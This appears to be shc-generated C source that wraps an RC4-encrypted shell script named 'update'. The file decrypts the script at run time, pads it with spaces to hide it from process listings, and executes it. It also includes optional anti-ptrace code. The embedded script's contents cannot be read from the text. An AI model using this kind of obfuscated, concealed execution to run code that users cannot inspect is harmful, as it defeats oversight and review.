#if 0
	shc Version 3.8.9b, Generic Script Compiler
	Copyright (c) 1994-2015 Francisco Rosales <frosal@fi.upm.es>

	shc -r -T -f ./update 
#endif

static  char data [] = 
#define      tst1_z	22
#define      tst1	((&data[3]))
	"\016\222\223\171\104\034\222\031\073\021\277\027\114\152\024\007"
	"\262\017\221\045\375\073\274\025\232\323\340\061"
#define      chk2_z	19
#define      chk2	((&data[30]))
	"\002\030\037\261\356\233\014\023\261\166\005\304\042\323\132\144"
	"\333\102\235\325\256"
#define      chk1_z	22
#define      chk1	((&data[53]))
	"\017\350\256\067\015\343\300\205\007\135\263\204\363\301\253\072"
	"\043\141\122\073\071\221\146\116\063\020\014"
#define      msg2_z	19
#define      msg2	((&data[78]))
	"\135\171\321\177\151\247\160\261\174\206\275\236\050\037\311\126"
	"\242\316\254\156\002\071\233\151\170"
#define      msg1_z	42
#define      msg1	((&data[111]))
	"\045\206\233\370\146\315\365\333\341\367\032\207\261\074\204\246"
	"\000\213\200\111\331\332\325\261\107\115\340\237\220\161\326\204"
	"\132\236\211\312\001\173\176\336\032\305\015\334\040\044\224\166"
	"\251\163\235\023"
#define      pswd_z	256
#define      pswd	((&data[182]))
	"\075\203\260\354\273\274\223\067\212\360\260\303\213\032\074\241"
	"\016\104\306\224\340\277\372\255\265\326\217\254\312\175\336\206"
	"\005\067\003\130\227\242\312\134\267\127\152\007\233\335\057\314"
	"\344\345\062\174\017\174\036\136\212\245\333\116\042\272\325\050"
	"\361\330\200\211\172\112\345\061\241\120\071\075\055\151\011\022"
	"\116\074\217\135\270\255\274\102\123\227\221\166\121\146\236\103"
	"\076\036\314\271\150\261\353\012\001\044\110\057\215\122\102\333"
	"\216\321\070\107\177\365\212\322\214\033\110\336\202\346\042\300"
	"\004\356\172\155\240\145\170\242\211\301\321\027\023\024\362\242"
	"\345\053\352\144\040\164\067\255\220\177\214\022\146\256\323\153"
	"\234\115\331\074\263\122\336\075\023\260\124\047\304\107\312\252"
	"\163\264\017\224\050\106\102\270\306\316\313\055\174\236\230\031"
	"\354\162\126\237\304\065\334\330\346\061\377\253\170\311\125\354"
	"\175\144\200\246\253\302\137\161\221\052\236\015\311\067\047\265"
	"\251\175\125\155\263\062\106\231\143\105\105\334\017\232\310\215"
	"\377\111\063\252\014\223\033\235\276\272\253\207\361\322\075\232"
	"\120\222\010\004\305\116\235\051\224\343\005\243\175\316\061\175"
	"\027\144\047\043\370\103\301\266\376\154\075\357\076\002\165\010"
	"\206\046\365\102\342\210\171\155\170\052\060\003\104\155\245\122"
	"\261\154\346\222\053\341\077\341\270\316\215\203\321\003\214\130"
	"\051\201\232\014\011\023\171\201\075\252\204\201\027\052\324"
#define      opts_z	1
#define      opts	((&data[488]))
	"\316"
#define      xecc_z	15
#define      xecc	((&data[492]))
	"\232\243\125\351\203\360\272\353\040\036\164\320\211\307\366\343"
	"\227\032\151\061"
#define      text_z	483
#define      text	((&data[536]))
	"\144\222\136\345\054\152\356\100\343\160\175\216\365\377\245\037"
	"\323\157\266\216\312\170\053\145\034\200\317\273\155\226\166\107"
	"\171\020\344\333\055\267\051\270\330\111\320\034\302\241\101\130"
	"\024\303\341\316\371\343\201\312\062\357\045\364\222\113\354\366"
	"\176\034\351\113\022\006\256\021\034\021\361\177\152\035\045\322"
	"\073\336\011\151\136\200\122\322\310\212\024\056\113\076\113\206"
	"\137\123\105\144\311\236\146\236\231\167\172\174\365\333\113\032"
	"\272\027\213\342\247\361\372\230\372\052\012\134\250\316\306\057"
	"\132\245\000\175\315\303\056\340\352\067\164\000\325\067\366\171"
	"\225\347\317\021\026\044\174\060\362\372\372\151\036\131\265\037"
	"\066\033\345\320\150\113\345\157\267\336\046\330\262\045\124\215"
	"\242\112\231\256\351\247\115\302\355\160\074\161\126\077\222\326"
	"\354\143\153\354\077\341\174\322\221\040\257\337\123\073\027\316"
	"\255\161\261\316\023\063\005\251\024\246\152\357\237\170\054\067"
	"\207\362\272\315\133\322\325\333\136\325\162\061\150\261\177\366"
	"\165\022\146\214\360\322\121\336\171\176\003\032\034\354\223\304"
	"\052\113\164\277\124\227\075\166\260\037\076\270\351\260\367\057"
	"\216\163\163\076\202\132\254\310\320\332\374\166\200\065\210\353"
	"\227\373\326\165\244\234\042\243\163\035\266\127\100\014\010\025"
	"\062\221\161\117\304\313\040\137\375\057\366\274\017\274\310\243"
	"\047\133\333\003\061\376\220\206\260\172\163\207\136\357\213\175"
	"\377\050\272\076\214\056\326\320\366\071\203\031\244\370\336\147"
	"\350\051\103\254\361\150\144\326\313\177\375\376\255\074\033\201"
	"\162\252\003\135\312\263\112\147\155\064\121\262\053\171\222\001"
	"\266\061\017\042\072\110\026\215\326\355\044\155\140\144\163\032"
	"\121\157\247\246\352\300\232\135\363\242\334\166\236\117\117\271"
	"\153\002\262\273\050\061\065\105\352\030\342\206\164\103\231\327"
	"\073\374\376\004\342\350\302\026\323\064\142\325\065\303\145\003"
	"\212\353\101\330\347\231\102\371\145\017\223\036\145\056\003\032"
	"\266\204\047\260\075\235\077\102\140\157\107\267\337\360\017\017"
	"\351\257\302\275\355\117\313\147\344\121\211\126\152\241\207\361"
	"\026\014\225\004\153\070\106\211\223\130\047\035\044\157\115\130"
	"\011\202\275\234\340\242\311\113\221\011\057\001\206\275\366\206"
	"\143\025\131\322\313\350"
#define      rlax_z	1
#define      rlax	((&data[1043]))
	"\266"
#define      date_z	1
#define      date	((&data[1044]))
	"\260"
#define      tst2_z	19
#define      tst2	((&data[1048]))
	"\334\061\252\373\003\076\043\206\157\122\107\275\327\052\101\174"
	"\250\121\350\172\352\164\170\022\115\102"
#define      lsto_z	1
#define      lsto	((&data[1071]))
	"\365"
#define      shll_z	10
#define      shll	((&data[1074]))
	"\112\326\070\100\124\370\260\367\060\316\056\145\130\255"
#define      inlo_z	3
#define      inlo	((&data[1086]))
	"\322\232\102"/* End of data[] */;
#define      hide_z	4096
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	1	/* Define as 1 to enable ptrace the executable */

/* rtc.c */

#include <sys/stat.h>
#include <sys/types.h>

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

/* 'Alleged RC4' */

static unsigned char stte[256], indx, jndx, kndx;

/*
 * Reset arc4 stte. 
 */
void stte_0(void)
{
	indx = jndx = kndx = 0;
	do {
		stte[indx] = indx;
	} while (++indx);
}

/*
 * Set key. Can be used more than once. 
 */
void key(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		do {
			tmp = stte[indx];
			kndx += tmp;
			kndx += ptr[(int)indx % len];
			stte[indx] = stte[kndx];
			stte[kndx] = tmp;
		} while (++indx);
		ptr += 256;
		len -= 256;
	}
}

/*
 * Crypt data. 
 */
void arc4(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		indx++;
		tmp = stte[indx];
		jndx += tmp;
		stte[indx] = stte[jndx];
		stte[jndx] = tmp;
		tmp += stte[indx];
		*ptr ^= stte[tmp];
		ptr++;
		len--;
	}
}

/* End of ARC4 */

/*
 * Key with file invariants. 
 */
int key_with_file(char * file)
{
	struct stat statf[1];
	struct stat control[1];

	if (stat(file, statf) < 0)
		return -1;

	/* Turn on stable fields */
	memset(control, 0, sizeof(control));
	control->st_ino = statf->st_ino;
	control->st_dev = statf->st_dev;
	control->st_rdev = statf->st_rdev;
	control->st_uid = statf->st_uid;
	control->st_gid = statf->st_gid;
	control->st_size = statf->st_size;
	control->st_mtime = statf->st_mtime;
	control->st_ctime = statf->st_ctime;
	key(control, sizeof(control));
	return 0;
}

#if DEBUGEXEC
void debugexec(char * sh11, int argc, char ** argv)
{
	int i;
	fprintf(stderr, "shll=%s\n", sh11 ? sh11 : "<null>");
	fprintf(stderr, "argc=%d\n", argc);
	if (!argv) {
		fprintf(stderr, "argv=<null>\n");
	} else { 
		for (i = 0; i <= argc ; i++)
			fprintf(stderr, "argv[%d]=%.60s\n", i, argv[i] ? argv[i] : "<null>");
	}
}
#endif /* DEBUGEXEC */

void rmarg(char ** argv, char * arg)
{
	for (; argv && *argv && *argv != arg; argv++);
	for (; argv && *argv; argv++)
		*argv = argv[1];
}

int chkenv(int argc)
{
	char buff[512];
	unsigned long mask, m;
	int l, a, c;
	char * string;
	extern char ** environ;

	mask  = (unsigned long)&chkenv;
	mask ^= (unsigned long)getpid() * ~mask;
	sprintf(buff, "x%lx", mask);
	string = getenv(buff);
#if DEBUGEXEC
	fprintf(stderr, "getenv(%s)=%s\n", buff, string ? string : "<null>");
#endif
	l = strlen(buff);
	if (!string) {
		/* 1st */
		sprintf(&buff[l], "=%lu %d", mask, argc);
		putenv(strdup(buff));
		return 0;
	}
	c = sscanf(string, "%lu %d%c", &m, &a, buff);
	if (c == 2 && m == mask) {
		/* 3rd */
		rmarg(environ, &string[-l - 1]);
		return 1 + (argc - a);
	}
	return -1;
}

#if !defined(TRACEABLE)

#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>

#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
#	define PTRACE_ATTACH	PT_ATTACH
#endif
void untraceable(char * argv0)
{
	char proc[80];
	int pid, mine;

	switch(pid = fork()) {
	case  0:
		pid = getppid();
		/* For problematic SunOS ptrace */
#if defined(__FreeBSD__)
		sprintf(proc, "/proc/%d/mem", (int)pid);
#else
		sprintf(proc, "/proc/%d/as",  (int)pid);
#endif
		close(0);
		mine = !open(proc, O_RDWR|O_EXCL);
		if (!mine && errno != EBUSY)
			mine = !ptrace(PTRACE_ATTACH, pid, 0, 0);
		if (mine) {
			kill(pid, SIGCONT);
		} else {
			perror(argv0);
			kill(pid, SIGKILL);
		}
		_exit(mine);
	case -1:
		break;
	default:
		if (pid == waitpid(pid, 0, 0))
			return;
	}
	perror(argv0);
	_exit(1);
}
#endif /* !defined(TRACEABLE) */

char * xsh(int argc, char ** argv)
{
	char * scrpt;
	int ret, i, j;
	char ** varg;
	char * me = argv[0];

	stte_0();
	 key(pswd, pswd_z);
	arc4(msg1, msg1_z);
	arc4(date, date_z);
	if (date[0] && (atoll(date)<time(NULL)))
		return msg1;
	arc4(shll, shll_z);
	arc4(inlo, inlo_z);
	arc4(xecc, xecc_z);
	arc4(lsto, lsto_z);
	arc4(tst1, tst1_z);
	 key(tst1, tst1_z);
	arc4(chk1, chk1_z);
	if ((chk1_z != tst1_z) || memcmp(tst1, chk1, tst1_z))
		return tst1;
	ret = chkenv(argc);
	arc4(msg2, msg2_z);
	if (ret < 0)
		return msg2;
	varg = (char **)calloc(argc + 10, sizeof(char *));
	if (!varg)
		return 0;
	if (ret) {
		arc4(rlax, rlax_z);
		if (!rlax[0] && key_with_file(shll))
			return shll;
		arc4(opts, opts_z);
		arc4(text, text_z);
		arc4(tst2, tst2_z);
		 key(tst2, tst2_z);
		arc4(chk2, chk2_z);
		if ((chk2_z != tst2_z) || memcmp(tst2, chk2, tst2_z))
			return tst2;
		/* Prepend hide_z spaces to script text to hide it. */
		scrpt = malloc(hide_z + text_z);
		if (!scrpt)
			return 0;
		memset(scrpt, (int) ' ', hide_z);
		memcpy(&scrpt[hide_z], text, text_z);
	} else {			/* Reexecute */
		if (*xecc) {
			scrpt = malloc(512);
			if (!scrpt)
				return 0;
			sprintf(scrpt, xecc, me);
		} else {
			scrpt = me;
		}
	}
	j = 0;
	varg[j++] = argv[0];		/* My own name at execution */
	if (ret && *opts)
		varg[j++] = opts;	/* Options on 1st line of code */
	if (*inlo)
		varg[j++] = inlo;	/* Option introducing inline code */
	varg[j++] = scrpt;		/* The script itself */
	if (*lsto)
		varg[j++] = lsto;	/* Option meaning last option */
	i = (ret > 1) ? ret : 0;	/* Args numbering correction */
	while (i < argc)
		varg[j++] = argv[i++];	/* Main run-time arguments */
	varg[j] = 0;			/* NULL terminated array */
#if DEBUGEXEC
	debugexec(shll, j, varg);
#endif
	execvp(shll, varg);
	return shll;
}

int main(int argc, char ** argv)
{
#if DEBUGEXEC
	debugexec("main", argc, argv);
#endif
	argv[1] = xsh(argc, argv);
	fprintf(stderr, "%s%s%s: %s\n", argv[0],
		errno ? ": " : "",
		errno ? strerror(errno) : "",
		argv[1] ? argv[1] : "<null>"
	);
	return 1;
}
